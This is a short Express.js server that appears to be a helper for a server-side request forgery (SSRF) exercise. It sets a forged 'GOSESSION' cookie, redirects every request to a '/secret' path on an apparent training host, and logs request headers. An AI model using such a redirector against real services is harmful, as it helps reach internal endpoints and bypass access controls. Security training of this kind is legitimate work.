const express = require('express');
const app = express();
const port = 3000; // You can use any port that is free on your system

// Redirect all requests to the specific URL
app.get('*', (req, res) => {
    //add cookie adn redirect
    res.cookie('GOSESSION', 'guest-go1.11.5')
    res.redirect('https://ssrf1.secu-web.blackfoot.dev/secret');
    //res.status(200).send('Hello World');
    console.log('Request received');
    console.log(req.headers);
});

// Start the server
app.listen(process.env.PORT, () => {
    console.log(`Server running on http://localhost:${port}`);
});